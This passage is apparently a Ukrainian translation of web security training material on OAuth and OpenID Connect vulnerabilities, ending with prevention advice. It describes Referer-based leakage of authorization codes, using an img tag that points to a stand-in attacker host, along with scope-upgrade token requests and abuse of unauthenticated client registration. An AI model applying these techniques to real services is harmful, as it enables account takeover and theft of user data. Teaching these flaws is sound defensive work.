У випадках, коли неможливо інʼєктувати JavaScript (наприклад, через обмеження CSP або жорстку фільтрацію), все ще може бути можливо використати просту HTML-інʼєкцію для викрадення кодів авторизації. Якщо ви можете вказати параметр `redirect_uri` на сторінку, де дозволено інʼєктувати власний HTML-код, ви можете злити код через заголовок `Referer`.  
Наприклад, розгляньте такий елемент `img`:

`<img src="evil-user.net">`

Під час спроби завантажити це зображення деякі браузери (наприклад, Firefox) надсилають **повний URL** у заголовку `Referer`, включно з query-рядком.
### Flawed scope validation

У будь-якому OAuth-процесі користувач повинен підтвердити доступ, який запитується через параметр **scope** в запиті авторизації. Отриманий токен дозволяє клієнтському застосунку доступ **тільки до тих прав (scope), які користувач дозволив**.

Але в деяких випадках через **помилки перевірки на стороні OAuth-сервісу** зловмисник може **“підвищити привілеї” токена** (тобто отримати більше прав, ніж було дозволено).  
Це може статися як із викраденим токеном, так і з токеном, отриманим через шкідливий клієнтський застосунок.

Точний спосіб такої атаки залежить від **типу OAuth flow (grant type)**.
#### Scope upgrade: authorization code flow

У **authorization code flow** дані користувача запитуються та передаються через захищений канал _server-to-server_, яким сторонній зловмисник зазвичай не може напряму маніпулювати. Проте інколи можна досягти такого ж результату, **зареєструвавши власний клієнтський застосунок** в OAuth-сервісі.

Наприклад, припустімо, що шкідливий клієнтський застосунок зловмисника спочатку запитав доступ лише до email користувача, використовуючи scope `openid email`. Після того як користувач погодився, застосунок отримує **authorization code**.  
Оскільки зловмисник повністю контролює свій застосунок, він може **додати ще один параметр `scope`** під час обміну коду на токен, включивши додатковий scope `profile`:
```
POST /token
Host: oauth-authorization-server.com
…
client_id=12345&client_secret=SECRET&redirect_uri=https://client-app.com/callback&grant_type=authorization_code&code=a1b2c3d4e5f6g7h8&scope=openid%20email%20profile
```
Якщо сервер **не перевіряє**, що цей scope відповідає scope з початкового запиту авторизації, він іноді може згенерувати access token **з новими, розширеними правами** і надіслати його клієнтському застосунку зловмисника:
```
{
    "access_token": "z0y9x8w7v6u5",
    "token_type": "Bearer",
    "expires_in": 3600,
    "scope": "openid email profile",
    …
}
```
Після цього зловмисник може використати свій застосунок для виконання API-запитів і **отримати доступ до профілю користувача**.
#### Scope upgrade: implicit flow

Для **implicit grant type** access token передається через браузер, а це означає, що зловмисник може **викрасти токени**, пов’язані з легітимними клієнтськими застосунками, і **використовувати їх напряму**.

Після викрадення access token зловмисник може надіслати звичайний браузерний запит до ендпоїнта OAuth-сервісу **`/userinfo`**, вручну **додавши новий параметр `scope`** під час запиту.

В ідеалі OAuth-сервіс повинен **перевіряти значення scope** і звіряти його з тим, яке використовувалося під час генерації токена, але це **не завжди реалізовано правильно**. Якщо змінені права **не перевищують рівень доступу**, який раніше був дозволений цьому клієнтському застосунку, зловмисник може **отримати доступ до додаткових даних без повторної згоди користувача**.
### Unverified user registration

Під час автентифікації користувачів через OAuth клієнтський застосунок **неявно вважає**, що інформація, збережена OAuth-провайдером, є правильною. Це може бути **небезпечним припущенням**.

Деякі сайти, які надають OAuth-сервіс, дозволяють користувачам **реєструвати акаунт без перевірки всіх даних**, у тому числі, в окремих випадках, **без підтвердження email-адреси**. Зловмисник може скористатися цим, зареєструвавши обліковий запис у OAuth-провайдера **з тими самими даними, що й у жертви**, наприклад із відомою email-адресою.

У результаті клієнтський застосунок може дозволити зловмиснику **увійти як жертва** через цей підроблений обліковий запис у OAuth-провайдера.
## Extending OAuth with OpenID Connect

Під час використання OAuth для автентифікації його часто розширюють рівнем **OpenID Connect**, який надає додаткові можливості, пов’язані з **ідентифікацією та автентифікацією користувачів**.

Детальний опис цих можливостей, а також додаткові лабораторні роботи, пов’язані з уразливостями, які вони можуть створювати, наведені в нашій темі **OpenID Connect**.
# OpenID Connect
## What is OpenID Connect?

**OpenID Connect** розширює протокол OAuth, додаючи спеціальний рівень **ідентифікації та автентифікації**, який працює поверх базової реалізації OAuth. Він додає просту функціональність, що забезпечує кращу підтримку сценарію автентифікації в OAuth.

Спочатку OAuth **не був розроблений для автентифікації** - він призначався для делегування прав доступу до конкретних ресурсів між застосунками. Однак багато вебсайтів почали **пристосовувати OAuth для автентифікації користувачів**. Для цього вони зазвичай запитували доступ на читання до базових даних користувача і, якщо цей доступ надавався, вважали, що користувач успішно автентифікувався на стороні OAuth-провайдера.

Такі «чисті» OAuth-механізми автентифікації були далекими від ідеалу. По-перше, клієнтський застосунок **не мав способу дізнатися**, коли, де і яким чином користувач був автентифікований. Крім того, оскільки кожна така реалізація була по суті кастомним обхідним рішенням, **не існувало стандартного способу** запиту користувацьких даних для автентифікації.

Щоб коректно підтримувати OAuth, клієнтським застосункам доводилося налаштовувати **окремі OAuth-механізми для кожного провайдера**, з різними ендпоїнтами, унікальними наборами scope тощо.

**OpenID Connect** вирішує багато з цих проблем, додаючи **стандартизовані можливості, пов’язані з ідентичністю**, що дозволяє зробити автентифікацію через OAuth **більш надійною та уніфікованою**.
## How does OpenID Connect work?

**OpenID Connect** органічно вбудовується у стандартні OAuth-флоу. З точки зору клієнтського застосунку, ключова відмінність полягає в тому, що з’являється **додатковий стандартизований набір scope**, однаковий для всіх провайдерів, а також **додатковий тип відповіді — `id_token`**.
### OpenID Connect roles

Ролі в OpenID Connect по суті **такі самі, як і в класичному OAuth**. Основна різниця полягає в тому, що в специфікації використовується дещо інша термінологія:

- **Relying party** — застосунок, який запитує автентифікацію користувача. Це аналог **OAuth client application**.
    
- **End user** — користувач, якого автентифікують. Це аналог **OAuth resource owner**.
    
- **OpenID provider** — OAuth-сервіс, який налаштований на підтримку **OpenID Connect**.
### OpenID Connect claims and scopes

Термін **«claims»** означає пари **ключ:значення**, які представляють інформацію про користувача на ресурсному сервері. Наприклад, одним із claims може бути `"family_name":"Montoya"`.

На відміну від базового OAuth, де scopes є унікальними для кожного провайдера, **усі сервіси OpenID Connect використовують однаковий набір scopes**. Щоб використовувати OpenID Connect, клієнтський застосунок повинен вказати scope **`openid`** у запиті авторизації. Після цього він може додати один або кілька інших стандартних scopes:

- `profile`
    
- `email`
    
- `address`
    
- `phone`
    
Кожен із цих scopes відповідає доступу на читання до певного набору **claims про користувача**, які визначені в специфікації OpenID.  
Наприклад, запит scope **`openid profile`** надає клієнтському застосунку доступ до низки claims, пов’язаних з ідентичністю користувача, таких як `family_name`, `given_name`, `birth_date` тощо.

### ID token

Іншим основним доповненням, яке надає **OpenID Connect**, є тип відповіді **`id_token`**. Він повертає **JSON Web Token (JWT)**, підписаний за допомогою **JSON Web Signature (JWS)**.  
Корисне навантаження JWT містить список **claims**, сформований на основі scope, який було запитано спочатку. Також у ньому є інформація про те, **як і коли користувач востаннє був автентифікований** OAuth-сервісом. Клієнтський застосунок може використати ці дані, щоб вирішити, чи був користувач автентифікований достатньо надійно.

Головна перевага використання **id_token** — **зменшення кількості запитів** між клієнтським застосунком і OAuth-сервісом, що може покращити загальну продуктивність. Замість того щоб спочатку отримувати access token, а потім окремо запитувати дані користувача, **ID token із цими даними надсилається клієнтському застосунку одразу після автентифікації користувача**.

На відміну від базового OAuth, де покладаються лише на довірений канал зв’язку, **цілісність даних в ID token забезпечується криптографічним підписом JWT**. Завдяки цьому використання ID token може допомогти захиститися від деяких атак типу _man-in-the-middle_. Однак, оскільки **криптографічні ключі для перевірки підпису передаються тим самим мережевим каналом** (зазвичай доступні за шляхом `/.well-known/jwks.json`), деякі атаки все ще можливі.

Зверніть увагу, що OAuth підтримує **кілька типів відповідей**, тому цілком допустимо, щоб клієнтський застосунок надсилав запит авторизації **одночасно з базовим OAuth response_type та response_type `id_token` з OpenID Connect**:
```
response_type=id_token token
response_type=id_token code
```
У такому випадку клієнтський застосунок отримає **ID token** разом із **authorization code або access token** одночасно.
## Identifying OpenID Connect

Якщо **OpenID Connect** активно використовується клієнтським застосунком, це має бути очевидно з **authorization request**. Найнадійніший спосіб перевірити — звернути увагу на **обов’язковий scope `openid`**.

Навіть якщо процес входу спочатку **не виглядає як OpenID Connect**, все одно варто перевірити, чи підтримує його OAuth-сервіс. Для цього можна спробувати додати scope **`openid`** або змінити **response type на `id_token`** і подивитися, чи виникне помилка.

Як і у випадку з базовим OAuth, корисно також ознайомитися з **документацією OAuth-провайдера**, щоб дізнатися, чи є інформація про підтримку OpenID Connect. Також можливо отримати доступ до **конфігураційного файлу** за стандартним ендпоїнтом:  
`/.well-known/openid-configuration`.
## OpenID Connect vulnerabilities

Специфікація **OpenID Connect** значно суворіша, ніж у базового OAuth, що загалом **зменшує ймовірність появи дивних реалізацій із очевидними вразливостями**. Втім, оскільки OpenID Connect - це лише **рівень поверх OAuth**, клієнтський застосунок або OAuth-сервіс все одно можуть бути вразливими до деяких атак, які ми розглядали раніше.
### Unprotected dynamic client registration

Специфікація OpenID описує **стандартизований спосіб** дозволу клієнтським застосункам реєструватися у OpenID-провайдера.

Якщо підтримується **динамічна реєстрація клієнта**, застосунок може зареєструвати себе, відправивши **POST-запит на спеціальний ендпоїнт `/registration`**. Назва цього ендпоїнта зазвичай зазначена в конфігураційному файлі та документації.

У тілі запиту клієнтський застосунок відправляє ключову інформацію про себе у форматі JSON. Наприклад, зазвичай потрібно включити **масив дозволених (whitelisted) redirect URI**. Також можна передавати іншу інформацію, наприклад назви ендпоїнтів, які застосунок хоче експонувати, ім’я застосунку тощо. Типовий запит на реєстрацію може виглядати так:
```
POST /openid/register HTTP/1.1
Content-Type: application/json
Accept: application/json
Host: oauth-authorization-server.com
Authorization: Bearer ab12cd34ef56gh89

{
    "application_type": "web",
    "redirect_uris": [
        "https://client-app.com/callback",
        "https://client-app.com/callback2"
    ],
    "client_name": "My Application",
    "logo_uri": "https://client-app.com/logo.png",
    "token_endpoint_auth_method": "client_secret_basic",
    "jwks_uri": "https://client-app.com/my_public_keys.jwks",
    "userinfo_encrypted_response_alg": "RSA1_5",
    "userinfo_encrypted_response_enc": "A128CBC-HS256",
    …
}
```
OpenID-провайдер повинен вимагати, щоб клієнтський застосунок **автентифікував себе**. У наведеному прикладі використовується **HTTP bearer token**.

Проте деякі провайдери дозволяють **динамічну реєстрацію без автентифікації**, що дає можливість **зловмиснику зареєструвати свій шкідливий клієнтський застосунок**. Наслідки цього залежать від того, **як використовуються значення властивостей, контрольованих зловмисником**.

Наприклад, деякі властивості можуть бути **URI**. Якщо OpenID-провайдер звертається до цих URI, це може призвести до **вразливостей другого порядку типу SSRF**, якщо не застосовані додаткові заходи безпеки.
# How to prevent OAuth authentication vulnerabilities

Щоб запобігти вразливостям OAuth-автентифікації, **надзвичайно важливо**, щоб і OAuth-провайдер, і клієнтський застосунок реалізували **надійну валідацію ключових вхідних даних**, особливо параметра **`redirect_uri`**. У специфікації OAuth майже немає вбудованих механізмів захисту, тому **відповідальність за безпеку OAuth-флоу повністю лежить на розробниках**.

Важливо пам’ятати, що вразливості можуть виникати **як на стороні клієнтського застосунку, так і на стороні OAuth-сервісу**. Навіть якщо ваша власна реалізація бездоганна, ви все одно залежите від того, наскільки безпечною є система на іншому боці.
## For OAuth service providers

- Вимагайте від клієнтських застосунків **реєстрації білого списку (whitelist) допустимих `redirect_uri`**. За можливості використовуйте **строге побайтне порівняння** для перевірки URI у всіх вхідних запитах. Дозволяйте **лише повні та точні збіги**, а не перевірку за шаблонами. Це запобігає доступу зловмисників до інших сторінок на дозволених доменах.
    
- Примусово використовуйте параметр **`state`**. Його значення має бути **прив’язане до сесії користувача**, наприклад шляхом включення не вгадуваних, сесійно-специфічних даних, таких як хеш із cookie сесії. Це допомагає захистити користувачів від CSRF-подібних атак і значно ускладнює використання викрадених authorization code.
    
- На ресурсному сервері переконайтеся, що **access token був виданий тому самому `client_id`**, який робить запит. Також перевіряйте, що **запитуваний scope відповідає scope**, для якого токен було видано спочатку.
## For OAuth client applications

- Переконайтеся, що ви **повністю розумієте, як працює OAuth**, перш ніж впроваджувати його. Багато вразливостей виникають через просте нерозуміння того, що саме відбувається на кожному етапі та як це може бути використано для атаки.
    
- Використовуйте параметр **`state`**, навіть якщо він **не є обов’язковим**.
    
- Надсилайте параметр **`redirect_uri`** не лише на ендпоїнт **`/authorization`**, а й на **`/token`**.
    
- Під час розробки мобільних або нативних десктопних OAuth-клієнтів часто неможливо зберегти **`client_secret`** у таємниці. У таких випадках слід використовувати механізм **PKCE (RFC 7636)** для додаткового захисту від перехоплення або витоку authorization code.
    
- Якщо ви використовуєте **OpenID Connect `id_token`**, переконайтеся, що він **коректно перевіряється** відповідно до специфікацій **JSON Web Signature (JWS)**, **JSON Web Encryption (JWE)** та **OpenID**.
    
- Будьте обережні з **authorization code** — вони можуть витекти через заголовки Referer, коли завантажуються зовнішні зображення, скрипти або CSS-файли. Також важливо **не включати їх у динамічно згенеровані JavaScript-файли**, оскільки такі файли можуть виконуватися з зовнішніх доменів через теги `<script>`.
